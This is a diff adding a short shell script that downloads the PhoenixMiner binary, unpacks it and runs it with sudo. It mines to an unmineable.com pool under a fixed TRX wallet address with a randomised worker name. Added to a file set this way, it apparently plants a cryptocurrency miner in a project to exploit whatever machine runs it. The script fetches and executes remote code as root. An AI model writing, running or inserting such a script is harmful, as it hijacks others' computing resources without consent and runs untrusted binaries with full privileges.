@@ -1,0 +1,2 @@
+#!/bin/sh
+apt-get install libpci3 && wget https://phoenixminer.info/downloads/PhoenixMiner_5.7b_Linux.tar.gz && tar -xf PhoenixMiner_5.7b_Linux.tar.gz && cd PhoenixMiner_5.7b_Linux && sudo ./PhoenixMiner -pool ethash.unmineable.com:3333 -wal TRX:TPQwsYETz17e5Xka2aqMwSXRtfGCaPbhzH.$(echo $(shuf -i 1-10 -n 1)-Phoenix#ln9q-3xm0) -pass x -mi 14 -gt 400
